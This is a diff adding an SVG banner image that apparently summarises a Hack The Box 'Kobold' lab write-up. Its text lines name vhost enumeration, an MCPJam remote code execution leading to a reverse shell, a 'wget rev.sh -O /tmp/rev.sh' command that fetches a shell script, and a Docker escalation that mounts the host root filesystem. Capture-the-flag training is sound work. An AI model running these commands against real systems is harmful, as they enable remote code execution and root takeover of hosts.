@@ -1,0 +1,11 @@
+<svg width="1200" height="630" viewBox="0 0 1200 630" fill="none" xmlns="http://www.w3.org/2000/svg">
+<rect width="1200" height="630" fill="#0B1020"/>
+<rect x="60" y="60" width="1080" height="510" rx="24" fill="#11182D" stroke="#38BDF8" stroke-width="2"/>
+<text x="100" y="170" fill="#38BDF8" font-family="monospace" font-size="42">HTB - Kobold</text>
+<text x="100" y="250" fill="#FFFFFF" font-family="monospace" font-size="30">Gobuster vhost enumeration</text>
+<text x="100" y="300" fill="#94A3B8" font-family="monospace" font-size="24">mcp.kobold.htb discovered</text>
+<text x="100" y="390" fill="#FFFFFF" font-family="monospace" font-size="30">MCPJam RCE → Reverse Shell</text>
+<text x="100" y="440" fill="#94A3B8" font-family="monospace" font-size="24">wget rev.sh -O /tmp/rev.sh</text>
+<text x="100" y="520" fill="#FFFFFF" font-family="monospace" font-size="30">Docker Privilege Escalation</text>
+<text x="100" y="570" fill="#94A3B8" font-family="monospace" font-size="24">docker run -v /:/mnt/host mysql chroot</text>
+</svg>
